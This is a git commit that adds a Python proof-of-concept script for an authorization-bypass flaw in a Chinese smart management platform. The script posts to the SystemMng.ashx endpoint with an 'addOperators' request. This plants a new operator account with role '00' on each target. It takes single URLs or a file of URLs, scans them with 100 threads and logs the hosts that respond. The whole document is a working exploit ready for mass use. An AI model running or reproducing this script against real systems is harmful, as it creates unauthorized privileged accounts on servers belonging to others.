e2dae4feaec6457257370b3f6fb2b8da273e89d7
hardog123 <3331551889@qq.com>
2024-06-15 20:44:00 +0800

    Add files via upload

---
+++ POC/一脸通智慧管理平台权限绕过漏洞/一脸通智慧管理平台权限绕过漏洞.py
@@ -0,0 +1,88 @@
+import sys,requests,time,argparse
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+# 定义程序的横幅
+def banner():
+    test = """
+
+ ██░ ██  ▄▄▄       ██▀███  ▓█████▄  ▒█████    ▄████ 
+▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒
+▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒██░  ██▒▒██░▄▄▄░
+░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒██   ██░░▓█  ██▓
+░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░ ████▓▒░░▒▓███▀▒
+ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒ 
+ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░   ░ 
+ ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░ 
+ ░  ░  ░      ░  ░   ░        ░        ░ ░        ░ 
+                            ░                       
+                                       
+                            version:1.1.0
+                            author:Hardog                                    
+"""
+    print(test)
+
+# 主函数，解析命令行参数并调用相应的功能函数
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="一脸通智慧管理平台权限绕过漏洞")
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
+    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
+    args = parser.parse_args()
+
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip().replace('\n',''))
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
+
+# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
+def poc(target):
+    payload_url = '/SystemMng.ashx'
+    url = target + payload_url
+    headers = {
+        'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
+        'Accept-Encoding':'gzip, deflate',
+        'Accept':'*/*',
+        'Connection':'close',
+        'Accept-Language':'en',
+        'Content-Length':'174',
+    }
+    data = {
+        'operatorName':'test123456',
+        'operatorPw':'123456',
+        'operpassword':'123456',
+        'operatorRole':'00',
+        'visible_jh':'%E8%AF%B7%E9%80%89%E6%8B%A9',
+        'visible_dorm':'%E8%AF%B7%E9%80%89%E6%8B%A9',
+        'funcName':'addOperators'
+    }
+    proxies = {
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:80080'
+    }
+    
+    try:
+        res = requests.post(url=url,headers=headers,data=data,proxies=proxies,timeout=5,verify=False)
+        
+        if res.status_code == 200:
+            print(f"[+]该网站存在权限绕过漏洞，url为{target}")
+            with open("result.txt","a",encoding="utf-8") as fp:
+                fp.write(target+'\n')
+        else:
+            print(f"[-]该网站不存在权限绕过漏洞")
+
+    except Exception as e:
+        print(f"[*]该网站无法访问")
+
+# 程序入口点
+if __name__ == '__main__':
+    main()
